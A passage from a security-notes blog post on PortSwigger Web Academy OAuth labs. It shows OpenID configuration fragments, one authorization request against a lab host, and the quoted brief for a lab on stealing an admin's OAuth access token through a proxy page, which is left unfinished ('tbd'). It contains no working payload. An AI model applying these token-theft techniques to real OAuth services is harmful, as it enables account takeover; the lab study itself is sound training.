t","private_key_jwt"],"revocation_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"claim_types_supported":["normal"]}
</pre></table></code></div></div><p>OpenID Client registration can be found at <code class="language-plaintext highlighter-rouge">/reg</code> endpoint.</p><p><img data-src="images/a27abe929e56ebef4f4e229054ce39ebc62dda09c4eb89d40da2ccffd2cd903c.png" alt="picture 20" data-proofer-ignore></p><p>Client app has been succesfully created!</p><p>During the Authorize phase we can specify client id and URL</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>GET /auth?client_id=pzqqqsgjugy5wv6omxhmy&amp;redirect_uri=https://0a790040031c5eb2c4cc1cb3006d0067.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/2
</pre></table></code></div></div><h1 id="stealing-oauth-access-tokens-via-a-proxy-page">Stealing OAuth access tokens via a proxy page</h1><blockquote><p>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.</p><p>To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user’s account. Use the access token to obtain the admin’s API key and submit the solution using the button provided in the lab banner.</p><p>The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.</p><p>You can log in via your own social media account using the following credentials: wiener:peter.</p><p><strong>Note</strong></p><p>!!! As the victim uses Chrome, we recommend also using Chrome (or Burp’s built-in Chromium browser) to test your exploit.</p></blockquote><p>… tbd</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/oauth-2-0-authentication-vulnerabilities/'>OAuth 2.0 authentication vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/oauth-2-0-authentication-vulnerabilities/" class="post-tag no-text-decoration" >OAuth 2.0 authentication vulnerabilities</a> <a href="/tags/portswigger/" class="post-tag no-text-decoration" >Portswigger</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/oauth/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/oauth/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(Portswigger/WebAcademy) - OAuth 2.0 authentication vulnerabilities - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/oauth/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/websockets/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Websockets</h3><div class="text-muted small"><p> Intro This post/writeup is all about the insecure deserialization vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as we...</p></div></div></a></div><div class="card"> <a href="/posts/DOM_based_vulns/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - DOM-based Vulnerabilities</h3><div class="text-muted small"><p> Intro This post/writeup is all about the DOM-based Vulnerabilitiess. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div><div class="card"> <a href="/posts/stored_XSS/"><div class="card-body"> <em class="timeago small" date="2023-01-25 08:00:00 +0100" >Jan 25</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the stored XSS Vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/JWT_Token/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - JWT Token Vulnerabilities</p></a> <a href="/posts/simple-docker-tutorial/" class="btn btn-outline-primary" prompt="Newer"><p>Simple Docker Tutorial</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
